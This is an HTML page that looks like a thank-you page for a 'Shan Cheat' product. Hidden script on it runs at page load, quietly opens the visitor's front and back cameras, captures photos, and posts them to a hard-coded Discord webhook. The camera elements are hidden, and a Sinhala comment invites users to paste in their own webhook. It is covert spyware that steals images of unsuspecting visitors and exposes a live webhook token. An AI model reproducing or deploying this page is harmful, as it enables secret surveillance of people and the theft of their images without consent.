<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture & Discord Webhook</title>
</head>
<body>
    <h2>Thank You Support Shan Cheat</h2>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1340611241831567460/UX39W_BLMhrwgWA6tRwyv_km5GqiZOyXZ0hENlF2IdWT8zyxt38-SKLCeLa67RTBB7wq"; // මෙතැනට ඔබගේ Discord Webhook URL එක දැමන්න

        async function captureAndSendPhoto(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
                const video = document.getElementById("video");
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById("canvas");
                    const context = canvas.getContext("2d");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Stop the camera
                    stream.getTracks().forEach(track => track.stop());

                    // Convert to Base64 Image
                    const imageData = canvas.toDataURL("image/png");

                    // Send to Discord Webhook
                    fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: "Captured Image:",
                            embeds: [{ image: { url: imageData } }]
                        })
                    }).then(response => console.log("Image sent!"));
                }, 3000);
            } catch (error) {
                console.error("Camera access error:", error);
            }
        }

        async function startCapture() {
            await captureAndSendPhoto("user"); // Front Camera
            await captureAndSendPhoto("environment"); // Back Camera
        }

        // Start process after page load
        window.onload = startCapture;
    </script>
</body>
</html>
